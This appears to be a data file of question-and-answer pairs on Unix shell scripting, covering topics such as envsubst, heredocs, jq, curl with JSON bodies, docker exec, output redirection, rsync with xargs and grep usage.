    "How to substitute shell variables in complex text files": "Looking, it turns out on my system there is an envsubst command which is part of the gettext-base package.\nSo, this makes it easy:\nenvsubst < \"source.txt\" > \"destination.txt\"\nNote if you want to use the same file for both, you'll have to use something like moreutil's sponge, as suggested by Johnny Utahh: envsubst < \"source.txt\" | sponge \"source.txt\". (Because the shell redirect will otherwise empty the file before its read.)",
    "Can I call a function of a shell script from another shell script?": "You can refactor your second.sh script like this:\nfunc1 () {\n   fun=\"$1\"\n   book=\"$2\"\n   printf \"func=%s,book=%s\\n\" \"$fun\" \"$book\"\n}\n\nfunc2 () {\n   fun2=\"$1\"\n   book2=\"$2\"\n   printf \"func2=%s,book2=%s\\n\" \"$fun2\" \"$book2\"\n}\nAnd then call these functions from script first.sh like this:\n. ./second.sh\nfunc1 love horror\nfunc2 ball mystery\nOUTPUT:\nfunc=love,book=horror\nfunc2=ball,book2=mystery",
    "UNIX export command [closed]": "When you execute a program the child program inherits its environment variables from the parent. For instance if $HOME is set to /root in the parent then the child's $HOME variable is also set to /root.\nThis only applies to environment variable that are marked for export. If you set a variable at the command-line like\n$ FOO=\"bar\"\nThat variable will not be visible in child processes. Not unless you export it:\n$ export FOO\nYou can combine these two statements into a single one in bash (but not in old-school sh):\n$ export FOO=\"bar\"\nHere's a quick example showing the difference between exported and non-exported variables. To understand what's happening know that sh -c creates a child shell process which inherits the parent shell's environment.\n$ FOO=bar\n$ sh -c 'echo $FOO'\n\n$ export FOO\n$ sh -c 'echo $FOO'\nbar\nNote: To get help on shell built-in commands use help export. Shell built-ins are commands that are part of your shell rather than independent executables like /bin/ls.",
    "Multiline syntax for piping a heredoc; is this portable?": "Yes, the POSIX standard allows this. According to the 2008 version:\nThe here-document shall be treated as a single word that begins after the next <newline> and continues until there is a line containing only the delimiter and a <newline>, with no <blank> characters in between. Then the next here-document starts, if there is one.\nAnd includes this example of multiple \"here-documents\" in the same line:\ncat <<eof1; cat <<eof2\nHi,\neof1\nHelene.\neof2\nSo there is no problem doing redirections or pipes. Your example is similar to something like this:\ncat file |\ncmd\nAnd the shell grammar (further down on the linked page) includes these definitions:\npipe_sequence    :                             command\n                 | pipe_sequence '|' linebreak command\n\nnewline_list     :              NEWLINE\n                 | newline_list NEWLINE\n                 ;\nlinebreak        : newline_list\n                 | /* empty */\nSo a pipe symbol can be followed by an end-of-line and still be considered part of a pipeline.",
    "Remove duplicate lines without sorting [duplicate]": "The UNIX Bash Scripting blog suggests:\nawk '!x[$0]++'\nThis command is telling awk which lines to print. The variable $0 holds the entire contents of a line and square brackets are array access. So, for each line of the file, the node of the array x is incremented and the line printed if the content of that node was not (!) previously set.",
    "Associative arrays in shell scripts [duplicate]": "Another option, if portability is not your main concern, is to use associative arrays that are built in to the shell. This should work in bash 4.0 (available now on most major distros, though not on OS X unless you install it yourself), ksh, and zsh:\ndeclare -A newmap\nnewmap[name]=\"Irfan Zulfiqar\"\nnewmap[designation]=SSE\nnewmap[company]=\"My Own Company\"\n\necho ${newmap[company]}\necho ${newmap[name]}\nDepending on the shell, you may need to do a typeset -A newmap instead of declare -A newmap, or in some it may not be necessary at all.",
    "Modify a key-value in a json using jq in-place": "Use a temporary file; it's what any program that claims to do in-place editing is doing.\ntmp=$(mktemp)\njq '.address = \"abcde\"' test.json > \"$tmp\" && mv \"$tmp\" test.json\nIf the address isn't hard-coded, pass the correct address via a jq argument:\naddress=abcde\njq --arg a \"$address\" '.address = $a' test.json > \"$tmp\" && mv \"$tmp\" test.json",
    "Curl with multiline of JSON": "I remembered another way to do this with a \"Here Document\" as described in the Bash man page and detailed here. The @- means to read the body from STDIN, while << EOF means to pipe the script content until \"EOF\" as STDIN to curl. This layout may be easier to read than using separate files or the \"echo a variable\" approach.\ncurl -0 -v -X POST http://www.example.com/api/users \\\n-H \"Expect:\" \\\n-H 'Content-Type: application/json; charset=utf-8' \\\n--data-binary @- << EOF\n{\n    \"field1\": \"test\",\n    \"field2\": {\n        \"foo\": \"bar\"\n    }\n}\nEOF\nNOTE: Use the --trace <outfile> curl option to record exactly what goes over the wire. For some reason, this Here Document approach strips newlines. (Update: Newlines were stripped by curl -d option. Corrected!)",
    "How to check if a process is running inside docker container?": "Docker creates .dockerenv and .dockerinit (removed in v1.11) files at the top of the container's directory tree so you might want to check if those exist.\nSomething like this should work.\n#!/bin/bash\nif [ -f /.dockerenv ]; then\n    echo \"I'm inside matrix ;(\";\nelse\n    echo \"I'm living in real world!\";\nfi",
    "Running a script inside a docker container using shell script": "You can run a command in a running container using docker exec [OPTIONS] CONTAINER COMMAND [ARG...]:\ndocker exec mycontainer /path/to/test.sh\nAnd to run from a bash session:\ndocker exec -it mycontainer /bin/bash\nFrom there you can run your script.",
    "Bash script to calculate time elapsed": "I find it very clean to use the internal variable \"$SECONDS\"\nSECONDS=0 ; sleep 10 ; echo $SECONDS",
    "How to run a command in the background and get no output?": "Use nohup if your background job takes a long time to finish or you just use SecureCRT or something like it login the server.\nRedirect the stdout and stderr to /dev/null to ignore the output.\nnohup /path/to/your/script.sh > /dev/null 2>&1 &",
    "Why 0 is true but false is 1 in the shell?": "Bash is a programming (scripting) language, but it's also a shell and a user-interface. If 0 was error, then the program could only present one kind of error.\nHowever in Bash, any nonzero value is an error, and we may use any number from 1-255 to represent an error. This means we can have many different kinds of errors. 1 is a general error, 126 means that a file cannot be executed, 127 means 'command not found', etc. Here's a list of Bash Exit Codes With Special Meanings showing some of the most common exit codes.\nThere are also many kinds of success (exit status is 0). However, a success will allow you to proceed to the next step\u2014you can like print results to a screen, or execute a command, etc.",
    "Linux bash: Multiple variable assignment": "First thing that comes into my mind:\nread -r a b c <<<$(echo 1 2 3) ; echo \"$a|$b|$c\"\noutput is, unsurprisingly\n1|2|3",
    "What does $$ mean in the shell?": "$$ is the process ID (PID) in bash. Using $$ is a bad idea, because it will usually create a race condition, and allow your shell-script to be subverted by an attacker. See, for example, all these people who created insecure temporary files and had to issue security advisories.\nInstead, use mktemp. The Linux man page for mktemp is excellent. Here's some example code from it:\ntempfoo=`basename $0`\nTMPFILE=`mktemp -t ${tempfoo}` || exit 1\necho \"program output\" >> $TMPFILE",
    "How to reverse-i-search back and forth? [duplicate]": "There is a similar question here:\nControl-r reverse-i-search in Bash: how do you \"reset\" the search in Cygwin?\nFound another similar question on Super User:\n(reverse-i-search) in Bash\nApparently, both mention Ctrl+s, which may do the trick.",
    "How do I run a terminal command in a Swift script? (e.g. xcodebuild)": "If you would like to use command line arguments \"exactly\" as you would in command line (without separating all the arguments), try the following.\n(This answer improves off of LegoLess's answer and can be used in Swift 5)\nimport Foundation\n\nfunc shell(_ command: String) -> String {\n    let task = Process()\n    let pipe = Pipe()\n    \n    task.standardOutput = pipe\n    task.standardError = pipe\n    task.arguments = [\"-c\", command]\n    task.launchPath = \"/bin/zsh\"\n    task.standardInput = nil\n    task.launch()\n    \n    let data = pipe.fileHandleForReading.readDataToEndOfFile()\n    let output = String(data: data, encoding: .utf8)!\n    \n    return output\n}\n\n// Example usage:\nshell(\"ls -la\")\nUpdated / safer function calls 10/23/21: It's possible to run into a runtime error with the above shell command and if so, try swapping to the updated calls below. You'll need to use a do catch statement around the new shell command but hopefully this saves you some time searching for a way to catch unexpected error(s) too.\nExplanation: Since task.launch() isn't a throwing function it cannot be caught and I was finding it to occasionally simply crash the app when called. After much internet searching, I found the Process class has deprecated task.launch() in favor of a newer function task.run() which does throw errors properly w/out crashing the app. To find out more about the updated methods, please see: https://eclecticlight.co/2019/02/02/scripting-in-swift-process-deprecations/\nimport Foundation\n\n@discardableResult // Add to suppress warnings when you don't want/need a result\nfunc safeShell(_ command: String) throws -> String {\n    let task = Process()\n    let pipe = Pipe()\n    \n    task.standardOutput = pipe\n    task.standardError = pipe\n    task.arguments = [\"-c\", command]\n    task.executableURL = URL(fileURLWithPath: \"/bin/zsh\") //<--updated\n    task.standardInput = nil\n\n    try task.run() //<--updated\n    \n    let data = pipe.fileHandleForReading.readDataToEndOfFile()\n    let output = String(data: data, encoding: .utf8)!\n    \n    return output\n}\nExamples:\n// Example usage capturing error:\ndo {\n    try safeShell(\"ls -la\")\n}\ncatch {\n    print(\"\\(error)\") //handle or silence the error here\n}\n\n// Example usage where you don't care about the error and want a nil back instead\nlet result = try? safeShell(\"ls -la\")\n\n// Example usage where you don't care about the error or the return value\ntry? safeShell(\"ls -la\")\nNote: For the last case where you are using try? and aren't using the result, for some reason the compiler still warns you even though it's marked as @discardableResult. This only happens with try?, not try within a do-try-catch block or from within a throwing function. Either way, you can safely ignore it.",
    "Bash set +x without it being printed": "I had the same problem, and I was able to find a solution that doesn't use a subshell:\nset -x\ncommand\n{ set +x; } 2>/dev/null",
    "What does it mean in shell when we put a command inside dollar sign and parentheses: $(command)": "Usage of the $ like ${HOME} gives the value of HOME. Usage of the $ like $(echo foo) means run whatever is inside the parentheses in a subshell and return that as the value. In my example, you would get foo since echo will write foo to standard out",
    "How can I convert a string from uppercase to lowercase in Bash? [duplicate]": "If you are using Bash 4, you can use the following approach:\nx=\"HELLO\"\necho $x  # HELLO\n\ny=${x,,}\necho $y  # hello\n\nz=${y^^}\necho $z  # HELLO\nUse only one , or ^ to make the first letter lowercase or uppercase.",
    "grep -P no longer works. How can I rewrite my searches?": "If your scripts are for your use only, you can install grep from homebrew-core using brew:\nbrew install grep \nThen it's available as ggrep (GNU grep). it doesn't replaces the system grep (you need to put the installed grep before the system one on the PATH).\nThe version installed by brew includes the -P option, so you don't need to change your scripts.\nIf you need to use these commands with their normal names, you can add a \"gnubin\" directory to your PATH from your bashrc like:\nPATH=\"/usr/local/opt/grep/libexec/gnubin:$PATH\"\nYou can export this line on your ~/.bashrc or ~/.zshrc to keep it for new sessions.\nPlease see here for a discussion of the pro-s and cons of the old --with-default-names option and it's (recent) removal.",
    "How to hide command output in Bash": "Use this.\n{\n  /your/first/command\n  /your/second/command\n} &> /dev/null\nExplanation\nTo eliminate output from commands, you have two options:\nClose the output descriptor file, which keeps it from accepting any more input. That looks like this:\nyour_command \"Is anybody listening?\" >&-\nUsually, output goes either to file descriptor 1 (stdout) or 2 (stderr). If you close a file descriptor, you'll have to do so for every numbered descriptor, as &> (below) is a special BASH syntax incompatible with >&-:\n/your/first/command >&- 2>&-\nBe careful to note the order: >&- closes stdout, which is what you want to do; &>- redirects stdout and stderr to a file named - (hyphen), which is not what what you want to do. It'll look the same at first, but the latter creates a stray file in your working directory. It's easy to remember: >&2 redirects stdout to descriptor 2 (stderr), >&3 redirects stdout to descriptor 3, and >&- redirects stdout to a dead end (i.e. it closes stdout).\nAlso beware that some commands may not handle a closed file descriptor particularly well (\"write error: Bad file descriptor\"), which is why the better solution may be to...\nRedirect output to /dev/null, which accepts all output and does nothing with it. It looks like this:\nyour_command \"Hello?\" > /dev/null\nFor output redirection to a file, you can direct both stdout and stderr to the same place very concisely, but only in bash:\n/your/first/command &> /dev/null\nFinally, to do the same for a number of commands at once, surround the whole thing in curly braces. Bash treats this as a group of commands, aggregating the output file descriptors so you can redirect all at once. If you're familiar instead with subshells using ( command1; command2; ) syntax, you'll find the braces behave almost exactly the same way, except that unless you involve them in a pipe the braces will not create a subshell and thus will allow you to set variables inside.\n{\n  /your/first/command\n  /your/second/command\n} &> /dev/null\nSee the bash manual on redirections for more details, options, and syntax.",
    "How to grep a text file which contains some binary data?": "grep -a\nIt can't get simpler than that.",
    "Useless use of cat?": "I was not aware of the award until today when some rookie tried to pin the UUOC on me for one of my answers. It was a cat file.txt | grep foo | cut ... | cut .... I gave him a piece of my mind, and only after doing so visited the link he gave me referring to the origins of the award and the practice of doing so. Further searching led me to this question. Somewhat unfortunately despite conscious consideration, none of the answers included my rationale.\nI had not meant to be defensive in responding to him. After all, in my younger years, I would have written the command as grep foo file.txt | cut ... | cut ... because whenever you do the frequent single greps you learn the placement of the file argument and it is ready knowledge that the first is the pattern and the later ones are file names.\nIt was a conscious choice to use cat when I answered the question, partly because of a reason of \"good taste\" (in the words of Linus Torvalds) but chiefly for a compelling reason of function.\nThe latter reason is more important so I will put it out first. When I offer a pipeline as a solution I expect it to be reusable. It is quite likely that a pipeline would be added at the end of or spliced into another pipeline. In that case having a file argument to grep screws up reusability, and quite possibly do so silently without an error message if the file argument exists. I. e. grep foo xyz | grep bar xyz | wc will give you how many lines in xyz contain bar while you are expecting the number of lines that contain both foo and bar. Having to change arguments to a command in a pipeline before using it is prone to errors. Add to it the possibility of silent failures and it becomes a particularly insidious practice.\nThe former reason is not unimportant either since a lot of \"good taste\" merely is an intuitive subconscious rationale for things like the silent failures above that you cannot think of right at the moment when some person in need of education says \"but isn't that cat useless\".\nHowever, I will try to also make conscious the former \"good taste\" reason I mentioned. That reason has to do with the orthogonal design spirit of Unix. grep does not cut and ls does not grep. Therefore at the very least grep foo file1 file2 file3 goes against the design spirit. The orthogonal way of doing it is cat file1 file2 file3 | grep foo. Now, grep foo file1 is merely a special case of grep foo file1 file2 file3, and if you do not treat it the same you are at least using up brain clock cycles trying to avoid the useless cat award.\nThat leads us to the argument that grep foo file1 file2 file3 is concatenating, and cat concatenates so it is proper to cat file1 file2 file3 but because cat is not concatenating in cat file1 | grep foo therefore we are violating the spirit of both the cat and the almighty Unix. Well, if that were the case then Unix would need a different command to read the output of one file and spit it to stdout (not paginate it or anything just a pure spit to stdout). So you would have the situation where you say cat file1 file2 or you say dog file1 and conscientiously remember to avoid cat file1 to avoid getting the award, while also avoiding dog file1 file2 since hopefully the design of dog would throw an error if multiple files are specified.\nHopefully, at this point, you sympathize with the Unix designers for not including a separate command to spit a file to stdout, while also naming cat for concatenate rather than giving it some other name. <edit> removed incorrect comments on <, in fact, < is an efficient no-copy facility to spit a file to stdout which you can position at the beginning of a pipeline so the Unix designers did include something specifically for this </edit>\nThe next question is why is it important to have commands that merely spit a file or the concatenation of several files to stdout, without any further processing? One reason is to avoid having every single Unix command that operates on standard input to know how to parse at least one command line file argument and use it as input if it exists. The second reason is to avoid users having to remember: (a) where the filename arguments go; and (b) avoid the silent pipeline bug as mentioned above.\nThat brings us to why grep does have the extra logic. The rationale is to allow user-fluency for commands that are used frequently and on a stand-alone basis (rather than as a pipeline). It is a slight compromise of orthogonality for a significant gain in usability. Not all commands should be designed this way and commands that are not frequently used should completely avoid the extra logic of file arguments (remember extra logic leads to unnecessary fragility (the possibility of a bug)). The exception is to allow file arguments like in the case of grep. (By the way, note that ls has a completely different reason to not just accept but pretty much require file arguments)\nFinally, what could have been done better is if such exceptional commands as grep (but not necessarily ls) generate an error if the standard input is also available when file arguments are specified.",
    "shell init issue when click tab, what's wrong with getcwd?": "This usually occurs when your current directory does not exist anymore. Most likely, from another terminal you remove that directory (from within a script or whatever). To get rid of this, in case your current directory was recreated in the meantime, just cd to another (existing) directory and then cd back; the simplest would be: cd; cd -.",
    "How do I activate a virtualenv inside PyCharm's terminal?": "Edit:\nAccording to https://www.jetbrains.com/pycharm/whatsnew/#v2016-3-venv-in-terminal, PyCharm 2016.3 (released Nov 2016) has virutalenv support for terminals out of the box\nAuto virtualenv is supported for bash, zsh, fish, and Windows cmd. You can customize your shell preference in Settings (Preferences) | Tools | Terminal | check Activate virtaulenv\nyou also need to make sure to have the path of virtual environment path included in the content root folder of your project structure. You can go to settings (preference) | project | Project Structure | if your environment is not included in the project directory.\n***Old Method:***\nCreate a file .pycharmrc in your home folder with the following contents\nsource ~/.bashrc\nsource ~/pycharmvenv/bin/activate\nUse your virtualenv path as the last parameter.\nThen set the shell Preferences->Project Settings->Shell path to\n/bin/bash --rcfile ~/.pycharmrc",
    "How to set environment variables in fish shell": "Use Universal Variables.\nIf the variable has to be shared between all the current user Fish instances on the current computer and preserved across restarts of the shell you can set them using -U or --universal. For example:\nset -Ux FOO bar\nUsing set with -g or --global doesn't set the variable persistently between shell instances.\nNote:\nDo not append to universal variables in config.fish file, because these variables will then get longer with each new shell instance. Instead, simply run set -Ux once at the command line.\nUniversal variables will be stored in the file ~/.config/fish/fish_variables as of Fish 3.0. In prior releases, it was ~/.config/fish/fishd.MACHINE_ID, where MACHINE_ID was typically the MAC address.",
    "Checking from shell script if a directory contains files": "Three best tricks\nshopt -s nullglob dotglob; f=your/dir/*; ((${#f}))\nThis trick is 100% bash and invokes (spawns) a sub-shell. The idea is from Bruno De Fraine and improved by teambob's comment.\nfiles=$(shopt -s nullglob dotglob; echo your/dir/*)\nif (( ${#files} ))\nthen\n  echo \"contains files\"\nelse \n  echo \"empty (or does not exist or is a file)\"\nfi\nNote: no difference between an empty directory and a non-existing one (and even when the provided path is a file).\nThere is a similar alternative and more details (and more examples) on the 'official' FAQ for #bash IRC channel:\nif (shopt -s nullglob dotglob; f=(*); ((${#f[@]})))\nthen\n  echo \"contains files\"\nelse \n  echo \"empty (or does not exist, or is a file)\"\nfi\n[ -n \"$(ls -A your/dir)\" ]\nThis trick is inspired from nixCraft's article posted in 2007. Add 2>/dev/null to suppress the output error \"No such file or directory\".\nSee also Andrew Taylor's answer (2008) and gr8can8dian's answer (2011).\nif [ -n \"$(ls -A your/dir 2>/dev/null)\" ]\nthen\n  echo \"contains files (or is a file)\"\nelse\n  echo \"empty (or does not exist)\"\nfi\nor the one-line bashism version:\n[[ $(ls -A your/dir) ]] && echo \"contains files\" || echo \"empty\"\nNote: ls returns $?=2 when the directory does not exist. But no difference between a file and an empty directory.\n[ -n \"$(find your/dir -prune -empty)\" ]\nThis last trick is inspired from gravstar's answer where -maxdepth 0 is replaced by -prune and improved by phils's comment.\nif [ -n \"$(find your/dir -prune -empty 2>/dev/null)\" ]\nthen\n  echo \"empty (directory or file)\"\nelse\n  echo \"contains files (or does not exist)\"\nfi\na variation using -type d:\nif [ -n \"$(find your/dir -prune -empty -type d 2>/dev/null)\" ]\nthen\n  echo \"empty directory\"\nelse\n  echo \"contains files (or does not exist or is not a directory)\"\nfi\nExplanation:\nfind -prune is similar than find -maxdepth 0 using less characters\nfind -empty prints the empty directories and files\nfind -type d prints directories only\nNote: You could also replace [ -n \"$(find your/dir -prune -empty)\" ] by just the shorten version below:\nif [ `find your/dir -prune -empty 2>/dev/null` ]\nthen\n  echo \"empty (directory or file)\"\nelse\n  echo \"contains files (or does not exist)\"\nfi\nThis last code works most of the cases but be aware that malicious paths could express a command...",
    "How to print third column to last column?": "...or a simpler solution: cut -f 3- INPUTFILE just add the correct delimiter (-d) and you got the same effect.",
    "Speed up rsync with Simultaneous/Concurrent File Transfers?": "Updated answer (Jan 2020)\nxargs is now the recommended tool to achieve parallel execution. It's pre-installed almost everywhere. For running multiple rsync tasks the command would be:\nls /srv/mail | xargs -n1 -P4 -I% rsync -Pa % myserver.com:/srv/mail/\nThis will list all folders in /srv/mail, pipe them to xargs, which will read them one-by-one and and run 4 rsync processes at a time. The % char replaces the input argument for each command call.\nOriginal answer using parallel:\nls /srv/mail | parallel -v -j8 rsync -raz --progress {} myserver.com:/srv/mail/{}",
    "Compare two files line by line and generate the difference in another file": "diff(1) is not the answer, but comm(1) is.\nNAME\n       comm - compare two sorted files line by line\n\nSYNOPSIS\n       comm [OPTION]... FILE1 FILE2\n\n...\n\n       -1     suppress lines unique to FILE1\n\n       -2     suppress lines unique to FILE2\n\n       -3     suppress lines that appear in both files\nSo\ncomm -2 -3 file1 file2 > file3\nThe input files must be sorted. If they are not, sort them first. This can be done with a temporary file, or...\ncomm -2 -3 <(sort file1) <(sort file2) > file3\nprovided that your shell supports process substitution (bash does).",
    "How to repeat last command in python interpreter shell?": "In IDLE, go to Options -> Configure IDLE -> Keys and there select history-next and then history-previous to change the keys.\nThen click on Get New Keys for Selection and you are ready to choose whatever key combination you want.",
    "How do you append to an already existing string?": "In classic sh, you have to do something like:\ns=test1\ns=\"${s}test2\"\n(there are lots of variations on that theme, like s=\"$s\"\"test2\")\nIn bash, you can use +=:\ns=test1\ns+=test2",
    "Run a JAR file from the command line and specify classpath": "When you specify -jar then the -cp parameter will be ignored.\nFrom the documentation:\nWhen you use this option, the JAR file is the source of all user classes, and other user class path settings are ignored.\nYou also cannot \"include\" needed jar files into another jar file (you would need to extract their contents and put the .class files into your jar file)\nYou have two options:\ninclude all jar files from the lib directory into the manifest (you can use relative paths there)\nSpecify everything (including your jar) on the commandline using -cp:\njava -cp MyJar.jar:lib/* com.somepackage.subpackage.Main",
    "Changing all occurrences in a folder": "There is no way to do it using only sed. You'll need to use at least the find utility together:\nfind . -type f -exec sed -i.bak \"s/foo/bar/g\" {} \\;\nThis command will create a .bak file for each changed file.\nNotes:\nThe -i argument for sed command is a GNU extension, so, if you are running this command with the BSD's sed you will need to redirect the output to a new file then rename it.\nThe find utility does not implement the -exec argument in old UNIX boxes, so, you will need to use a | xargs instead.",
    "How do I append text to a file?": "How about:\necho \"hello\" >> <filename>\nUsing the >> operator will append data at the end of the file, while using the > will overwrite the contents of the file if already existing.\nYou could also use printf in the same way:\nprintf \"hello\" >> <filename>\nNote that it can be dangerous to use the above. For instance if you already have a file and you need to append data to the end of the file and you forget to add the last > all data in the file will be destroyed. You can change this behavior by setting the noclobber variable in your .bashrc:\nset -o noclobber\nNow when you try to do echo \"hello\" > file.txt you will get a warning saying cannot overwrite existing file.\nTo force writing to the file you must now use the special syntax:\necho \"hello\" >| <filename>\nYou should also know that by default echo adds a trailing new-line character which can be suppressed by using the -n flag:\necho -n \"hello\" >> <filename>\nReferences\necho(1) - Linux man page\nnoclobber variable\nI/O Redirection",
    "How to Batch Rename Files in a macOS Terminal?": "In your specific case you can use the following bash command (bash is the default shell on macOS):\nfor f in *.png; do echo mv \"$f\" \"${f/_*_/_}\"; done\nNote: If there's a chance that your filenames start with -, place -- before them[1]:\nmv -- \"$f\" \"${f/_*_/_}\"\nNote: echo is prepended to mv so as to perform a dry run. Remove it to perform actual renaming.\nYou can run it from the command line or use it in a script.\n\"${f/_*_/_}\" is an application of bash parameter expansion: the (first) substring matching pattern _*_ is replaced with literal _, effectively cutting the middle token from the name.\nNote that _*_ is a pattern (a wildcard expression, as also used for globbing), not a regular expression (to learn about patterns, run man bash and search for Pattern Matching).\nIf you find yourself batch-renaming files frequently, consider installing a specialized tool such as the Perl-based rename utility. On macOS you can install it using popular package manager Homebrew as follows:\nbrew install rename\nHere's the equivalent of the command at the top using rename:\nrename -n -e 's/_.*_/_/'  *.png\nAgain, this command performs a dry run; remove -n to perform actual renaming.\nSimilar to the bash solution, s/.../.../ performs text substitution, but - unlike in bash - true regular expressions are used.\n[1] The purpose of special argument --, which is supported by most utilities, is to signal that subsequent arguments should be treated as operands (values), even if they look like options due to starting with -, as Jacob C. notes.",
    "How to set shell for npm run-scripts in Windows": "Since npm 5.1\nnpm config set script-shell \"C:\\\\Program Files (x86)\\\\git\\\\bin\\\\bash.exe\"  \nor (64bit installation)\nnpm config set script-shell \"C:\\\\Program Files\\\\git\\\\bin\\\\bash.exe\"\nNote that you need to have git for windows installed.\nYou can revert it by running:\nnpm config delete script-shell",
    "Getting pids from ps -ef |grep keyword": "You can use pgrep as long as you include the -f options. That makes pgrep match keywords in the whole command (including arguments) instead of just the process name.\npgrep -f keyword\nFrom the man page:\n-f       The pattern is normally only matched against the process name. When -f is set, the full command line is used.\nIf you really want to avoid pgrep, try:\nps -ef | awk '/[k]eyword/{print $2}'\nNote the [] around the first letter of the keyword. That's a useful trick to avoid matching the awk command itself.",
    "sed whole word search and replace": "\\b in regular expressions match word boundaries (i.e. the location between the first word character and non-word character):\n$ echo \"bar embarassment\" | sed \"s/\\bbar\\b/no bar/g\"\nno bar embarassment",
    "How can I negate the return-value of a process?": "Previously, the answer was presented with what's now the first section as the last section.\nPOSIX Shell includes a ! operator\nPoking around the shell specification for other issues, I recently (September 2015) noticed that the POSIX shell supports a ! operator. For example, it is listed as a reserved word and can appear at the start of a pipeline \u2014 where a simple command is a special case of 'pipeline'. It can, therefore, be used in if statements and while or until loops too \u2014 in POSIX-compliant shells. Consequently, despite my reservations, it is probably more widely available than I realized back in 2008. A quick check of POSIX 2004 and SUS/POSIX 1997 shows that ! was present in both those versions.\nNote that the ! operator must appear at the beginning of the pipeline and negates the status code of the entire pipeline (i.e. the last command). Here are some examples.\n# Simple commands, pipes, and redirects work fine.\n$ ! some-command succeed; echo $?\n1\n$ ! some-command fail | some-other-command fail; echo $?\n0\n$ ! some-command < succeed.txt; echo $?\n1\n\n# Environment variables also work, but must come after the !.\n$ ! RESULT=fail some-command; echo $?\n0\n\n# A more complex example.\n$ if ! some-command < input.txt | grep Success > /dev/null; then echo 'Failure!'; recover-command; mv input.txt input-failed.txt; fi\nFailure!\n$ ls *.txt\ninput-failed.txt\nPortable answer \u2014 works with antique shells\nIn a Bourne (Korn, POSIX, Bash) script, I use:\nif ...command and arguments...\nthen : it succeeded\nelse : it failed\nfi\nThis is as portable as it gets. The 'command and arguments' can be a pipeline or other compound sequence of commands.\nA not command\nThe '!' operator, whether built-in to your shell or provided by the o/s, is not universally available. It isn't dreadfully hard to write, though - the code below dates back to at least 1991 (though I think I wrote a previous version even longer ago). I don't tend to use this in my scripts, though, because it is not reliably available.\n/*\n@(#)File:           $RCSfile: not.c,v $\n@(#)Version:        $Revision: 4.2 $\n@(#)Last changed:   $Date: 2005/06/22 19:44:07 $\n@(#)Purpose:        Invert success/failure status of command\n@(#)Author:         J Leffler\n@(#)Copyright:      (C) JLSS 1991,1997,2005\n*/\n\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include \"stderr.h\"\n\n#ifndef lint\nstatic const char sccs[] = \"@(#)$Id: not.c,v 4.2 2005/06/22 19:44:07 jleffler Exp $\";\n#endif\n\nint main(int argc, char **argv)\n{\n    int             pid;\n    int             corpse;\n    int             status;\n\n    err_setarg0(argv[0]);\n\n    if (argc <= 1)\n    {\n            /* Nothing to execute. Nothing executed successfully. */\n            /* Inverted exit condition is non-zero */\n            exit(1);\n    }\n\n    if ((pid = fork()) < 0)\n            err_syserr(\"failed to fork\\n\");\n\n    if (pid == 0)\n    {\n            /* Child: execute command using PATH etc. */\n            execvp(argv[1], &argv[1]);\n            err_syserr(\"failed to execute command %s\\n\", argv[1]);\n            /* NOTREACHED */\n    }\n\n    /* Parent */\n    while ((corpse = wait(&status)) > 0)\n    {\n            if (corpse == pid)\n            {\n                    /* Status contains exit status of child. */\n                    /* If exit status of child is zero, it succeeded, and we should\n                       exit with a non-zero status */\n                    /* If exit status of child is non-zero, if failed and we should\n                       exit with zero status */\n                    exit(status == 0);\n                    /* NOTREACHED */\n            }\n    }\n\n    /* Failed to receive notification of child's death -- assume it failed */\n    return (0);\n}\nThis returns 'success', the opposite of failure, when it fails to execute the command. We can debate whether the 'do nothing successfully' option was correct; maybe it should report an error when it isn't asked to do anything. The code in '\"stderr.h\"' provides simple error reporting facilities - I use it everywhere. Source code on request - see my profile page to contact me.",
    "How can I extract the first two characters of a string in shell scripting?": "Probably the most efficient method, if you're using the bash shell (and you appear to be, based on your comments), is to use the sub-string variant of parameter expansion:\npax> long=\"USCAGol.blah.blah.blah\"\npax> short=\"${long:0:2}\" ; echo \"${short}\"\nUS\nThis will set short to be the first two characters of long. If long is shorter than two characters, short will be identical to it.\nThis in-shell method is usually better if you're going to be doing it a lot (like 50,000 times per report as you mention) since there's no process creation overhead. All solutions which use external programs will suffer from that overhead.\nIf you also wanted to ensure a minimum length, you could pad it out before hand with something like:\npax> long=\"A\"\npax> tmpstr=\"${long}..\"\npax> short=\"${tmpstr:0:2}\" ; echo \"${short}\"\nA.\nThis would ensure that anything less than two characters in length was padded on the right with periods (or something else, just by changing the character used when creating tmpstr). It's not clear that you need this but I thought I'd put it in for completeness.\nHaving said that, there are any number of ways to do this with external programs (such as if you don't have bash available to you), some of which are:\nshort=$(echo \"${long}\" | cut -c1-2)\nshort=$(echo \"${long}\" | head -c2)\nshort=$(echo \"${long}\" | awk '{print substr ($0, 0, 2)}'\nshort=$(echo \"${long}\" | sed 's/^\\(..\\).*/\\1/')\nThe first two (cut and head) are identical for a single-line string - they basically both just give you back the first two characters. They differ in that cut will give you the first two characters of each line and head will give you the first two characters of the entire input\nThe third one uses the awk sub-string function to extract the first two characters and the fourth uses sed capture groups (using () and \\1) to capture the first two characters and replace the entire line with them. They're both similar to cut - they deliver the first two characters of each line in the input.\nNone of that matters if you are sure your input is a single line, they all have an identical effect.",
    "Unix - create path of folders and file": "Use && to combine two commands in one shell line:\nCOMMAND1 && COMMAND2\nmkdir -p /my/other/path/here/ && touch /my/other/path/here/cpedthing.txt\nNote: Previously I recommended usage of ; to separate the two commands but as pointed out by @trysis it's probably better to use && in most situations because in case COMMAND1 fails COMMAND2 won't be executed either. (Otherwise this might lead to issues you might not have been expecting.)",
    "What's the Android ADB shell \"dumpsys\" tool and what are its benefits?": "",
    "Simulating ENTER keypress in bash script": "echo -ne '\\n' | <yourfinecommandhere>\nor taking advantage of the implicit newline that echo generates (thanks Marcin)\necho | <yourfinecommandhere>",
    "Get specific line from text file using just shell script": "sed:\nsed '5!d' file\nawk:\nawk 'NR==5' file",
    "How to append the output to a file?": "Use >> to append:\ncommand >> file",
    "Linux shell scripting error for double quotes sentence closing [closed]": "It means you've executed a line of code with only one double-quote character, like this:\necho \"Hello\nThe shell is waiting for the other quote.",
    "Finding most changed files in Git": "You could do something like the following:\ngit log --pretty=format: --name-only | sort | uniq -c | sort -rg | head -10\nThe log just outputs the names of the files that have been changed in each commit, while the rest of it just sorts and outputs the top 10 most frequently appearing filenames.",
